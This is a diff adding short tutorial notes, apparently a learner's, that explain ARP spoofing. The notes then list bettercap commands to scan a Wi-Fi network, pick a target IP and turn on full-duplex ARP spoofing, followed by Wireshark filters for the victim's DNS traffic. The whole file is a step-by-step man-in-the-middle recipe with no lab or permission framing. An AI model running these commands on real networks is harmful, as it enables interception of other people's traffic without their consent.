@@ -1,0 +1,51 @@
+               HOW IT WORKS
+               -------------
+- When a target is connected to the router, the router using arp.
+    - This know where the target is which allows it to know which device to send the info to.
+               
+- To conduct this hack the hacker messes with the arp in a method called arp spoofing.
+    - This works by decieving both the device and the router and making all communication pass through him.
+
+               
+                USAGE
+                ---------
+- We start a bettercap to see all the devices on the network using the command:
+    EG.
+        bettercap -iface wlp2s0 -> bettercap -iface <network interface card>
+
+        - It will open a kind of terminal like metasploit.
+
+
+    - Then we type this command to see all the devices on the network:
+        EG.
+            net.probe on
+
+            - This will scan the current wifi network and find targets.
+
+        
+        - Then to see what network have been found you use:
+            EG.
+                net.show
+
+                - it will produce a table with the devices found on the network.
+
+
+        - Then we set up the arp using the command:
+            EG.
+                set arp.spoof.fullduplex true
+
+            
+            - Then we specify the target.
+                EG.
+                    set arp.spoof.targets 192.168.0.103 -> arp spoof.targets <ip of the target>
+
+
+            - Then turn arp spoofing on:
+                EG.
+                    arp.spoof on
+
+
+                - After this we turn on wireshark and filter by the ip of the device.
+                - Then we can filter by dns to see all the communication between sites.
+                    EG.
+                     ip.addr = <the ip > and dns
